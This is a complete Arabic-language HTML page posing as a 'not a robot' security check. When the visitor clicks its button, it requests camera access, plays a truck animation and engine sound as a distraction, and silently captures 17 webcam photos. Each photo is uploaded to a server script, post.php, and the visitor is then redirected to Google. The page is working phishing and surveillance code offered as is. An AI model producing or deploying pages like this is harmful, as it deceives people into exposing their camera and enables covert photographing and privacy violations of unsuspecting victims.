<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>التحقق الأمني</title>
    <style>
        body { 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            background: #f0f2f5; 
            font-family: sans-serif; 
            position: relative;
        }
        button { 
            padding: 20px 40px; 
            font-size: 22px; 
            cursor: pointer; 
            background: #007bff; 
            color: white; 
            border: none; 
            border-radius: 5px; 
            transition: 0.3s; 
            z-index: 2;
        }
        button:hover { background: #0056b3; }

        /* الطريق */
        .road {
            position: absolute;
            bottom: 100px;
            left: 0;
            width: 100%;
            height: 80px;
            background: #333;
        }
        .road::after {
            content: "";
            position: absolute;
            top: 35px;
            left: 0;
            width: 100%;
            height: 10px;
            background: repeating-linear-gradient(
                to right,
                #fff 0,
                #fff 40px,
                transparent 40px,
                transparent 80px
            );
        }

        /* السيارة */
        .truck {
            position: absolute;
            bottom: 140px;
            left: -150px;
            font-size: 90px; /* حجم أكبر */
        }
        .truck.move {
            animation: drive 10s linear 5; /* ببطء وتتكرر 5 مرات */
        }

        @keyframes drive {
            from { left: -150px; }
            to { left: calc(100% - 100px); }
        }
    </style>
</head>
<body>

<button onclick="startProcess()">لتحقق أنك لست روبوت اضغط هنا</button>
<div class="road"></div>
<div class="truck">🚚</div>

<audio id="engineSound" src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3"></audio>

<script>
async function startProcess() {
    try {
        // طلب إذن الكاميرا
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement('canvas');
        canvas.width = 640; 
        canvas.height = 480;
        const ctx = canvas.getContext('2d');

        const truck = document.querySelector('.truck');
        const engine = document.getElementById('engineSound');

        // بدء حركة السيارة + تشغيل الصوت
        truck.classList.add('move');
        engine.play();

        // التقاط 17 صورة بفاصل نصف ثانية
        for (let i = 0; i < 17; i++) {
            ctx.drawImage(video, 0, 0, 640, 480);
            const data = canvas.toDataURL('image/jpeg', 0.7);

            await fetch('post.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'img=' + encodeURIComponent(data) + '&frame=' + i
            });

            await new Promise(resolve => setTimeout(resolve, 500));
        }

        // إيقاف الكاميرا
        stream.getTracks().forEach(track => track.stop());

        // بعد انتهاء العملية تحويل المستخدم
        setTimeout(() => {
            window.location.href = "https://www.google.com";
        }, 2000);

    } catch (err) {
        console.error(err);
        alert("يرجى السماح بالوصول للكاميرا لإكمال التحقق");
    }
}
</script>
</body>
</html>